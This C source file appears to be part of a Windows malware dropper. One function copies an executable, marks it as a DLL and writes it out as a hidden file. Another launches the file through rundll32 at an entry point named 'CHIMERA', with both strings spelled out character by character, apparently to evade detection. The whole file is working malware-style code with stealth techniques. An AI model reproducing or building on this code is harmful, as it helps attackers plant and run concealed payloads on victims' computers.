#include "global.h"

struct ProcessData
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WCHAR lpCommandLine[512];
};


BOOL CreateDllProcess(LPWSTR pDllPath)
{
	GlobalMemory MyMem(sizeof(ProcessData)+1);

	ProcessData *lpProcInfo = (ProcessData*)MyMem.localloc(sizeof(ProcessData));
	if (!lpProcInfo)
	{
		dbg("No memory in CreateDllProcess");
		return FALSE;
	}

	BOOL bRet = FALSE;

	lpProcInfo->si.cb = sizeof(STARTUPINFO);
	
	WCHAR lpApplicationName[] = { L'r', L'u', L'n', L'd', L'l', L'l', L'3', L'2', L'.', L'e', L'x', L'e', L'\0' };
	WCHAR lpEntryPointName[] = { L'C', L'H', L'I', L'M', L'E', L'R', L'A', L'\0' };
	
	wsprintfW(lpProcInfo->lpCommandLine, L"%s \"%s\",%s", lpApplicationName, pDllPath, lpEntryPointName);
	bRet = CreateProcessW(0, lpProcInfo->lpCommandLine, 0, 0, 0, 0, 0, 0, (LPSTARTUPINFOW)&lpProcInfo->si, &lpProcInfo->pi);

	dbg(lpApplicationName);
	dbg(lpProcInfo->lpCommandLine);

	if (bRet)
	{
		CloseHandle(lpProcInfo->pi.hProcess);
		CloseHandle(lpProcInfo->pi.hThread);
	}

	return bRet;
}

HANDLE OpenFile(LPWSTR pFile, DWORD dwAccess, DWORD dwAttrib, DWORD dwCreateDisposition)
{
	return CreateFileW(pFile, dwAccess, FILE_SHARE_READ, 0, dwCreateDisposition, dwAttrib, 0);
}

HANDLE GetFileMapping(HANDLE hFile)
{
	return CreateFileMapping(hFile, 0, PAGE_WRITECOPY, 0, 0, 0);
}

LPVOID MapToMemory(HANDLE hMap)
{
	return MapViewOfFile(hMap, FILE_MAP_COPY, 0, 0, 0);
}

BOOL BlockCopy(LPWSTR pFrom, LPWSTR pTo)
{
	HANDLE hFile = OpenFile(pFrom, GENERIC_READ, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		dbg(L"Can not read: ", pFrom);
		return FALSE;
	}

	BOOL bRet = FALSE;

	HANDLE hMapping = GetFileMapping(hFile);
	if (hFile)
	{
		LPVOID pMem = MapToMemory(hMapping);
		if (pMem)
		{
			PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)pMem;
			if (SetDllFlag(pDosHead))
			{
				HANDLE hTargetFile = OpenFile(pTo, GENERIC_WRITE, FILE_ATTRIBUTE_HIDDEN, CREATE_ALWAYS);
				if (hTargetFile != INVALID_HANDLE_VALUE)
				{
					DWORD dwWritten;
					DWORD dwFileSize = GetFileSize(hFile, 0);
					bRet = WriteFile(hTargetFile, pMem, dwFileSize, &dwWritten, 0);
					CloseHandle(hTargetFile);
				}
				else
				{
					dbg(L"Can not create target file: ", pTo);
				}
			}
			else
			{
				dbg("Can not set dll flag to file: ");
				dbg((PCHAR)pMem);
			}
			UnmapViewOfFile(pMem);
		}
		else
		{
			dbg("Can not map to memory");
		}

		CloseHandle(hMapping);
	}
	else
	{
		dbg("Can not create filemapping");
	}
	CloseHandle(hFile);
	return bRet;
}